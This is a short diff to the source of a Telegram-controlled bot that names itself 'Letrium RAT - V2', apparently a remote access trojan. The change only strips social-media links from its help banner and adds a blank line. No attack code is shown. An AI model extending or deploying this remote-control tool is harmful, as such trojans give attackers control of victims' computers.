@@ -54,9 +54,9 @@ def handle_start(msg):
     bot.send_message(
         msg.chat.id,
         "*🔮 Letrium RAT 🔮 - V2*\n"
-        "[Telegram](https://t.me/cybermads)\n"
-        "[GitHub](https://github.com/madanokr001)\n"
-        "[Discord](https://discord.gg/RUc432Nc)\n\n"
+        "[Telegram]\n"
+        "[GitHub]\n"
+        "[Discord]\n\n"
         "*🔮 Letrium RAT - Helps 🔮*\n"
         "```\n"
         "🛠️ System Commands\n"
@@ -266,3 +266,4 @@ if __name__ == "__main__":
          ................................
     """)
     bot.infinity_polling()
+
